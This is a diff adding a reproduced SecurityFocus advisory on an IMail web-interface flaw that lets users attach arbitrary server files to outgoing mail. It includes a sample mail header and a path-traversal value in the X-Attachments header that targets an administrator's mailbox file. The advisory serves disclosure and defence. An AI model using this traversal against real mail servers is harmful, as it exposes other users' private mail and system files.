@@ -1,0 +1,45 @@
+source: http://www.securityfocus.com/bid/1617/info
+
+IPSWITCH ships a product titled IMail, an email server for usage on NT servers serving clients their mail via a web interface. To this end the IMail server provides a web server typically running on port 8383 for it's end users to access. Via this interface users may read and send mail, as well as mail with file attachments. Certain versions of IMail do not perform proper access validation however resulting in users being able to attach files resident on the server. The net result of this is users may attach files on the server to which they should have no access. This access is limited to the user privileges which the server is being run as, typically SYSTEM.
+
+It should be noted that once a user attachs the files in question the server deletes them.
+
+Here is a sample mail header sent by IMAIL web services which
+has an attachment. Please note that this is line wrapped for readability.
+
+Date: Tue, 11 Jul 2000 13:10:28 +0200
+Message-ID: <200007111310.AA2374238664@bar.com>
+MIME-Version: 1.0 Content-Type: multipart/mixed; 
+boundary="==IMail_v5.0==" 
+From: "Timescape" <foo@bar.com>
+Reply-To: <foo@bar.com> 
+To: <foo@bar.com>
+Subject: test
+X-Mailer: <IMail v5.01> 
+X-Attachments: D:\IMAIL\spool\gonzo2.jpg ;
+X-MimeOLE: Produced By Microsoft MimeOLE V5.00.2919.6700 
+Return-Path: <foo@bar.com> 
+X-OriginalArrivalTime: 11 Jul 2000 11:20:48.0256 (UTC) FILETIME=[10327800:01BFEB2A]
+
+This is a multi-part message in MIME format.
+
+--==IMail_v5.0==
+Content-Type: text/plain;
+charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+--==IMail_v5.0==
+Content-Type: application/octet-stream;
+name="gonzo2.jpg "
+Content-Transfer-Encoding: base64
+
+--==IMail_v5.0==--
+
+The thing which we will be exploiting is the
+X-Attachments: D:\IMAIL\spool\gonzo2.jpg ;
+
+I made it work by modifing the compose message HTML file and
+saved it locally. Then i can just arrange the path to the
+attachment so that it can read
+
+X-Attachments: D:\IMAIL\spool\..\bar\users\admin\main.mbx ;
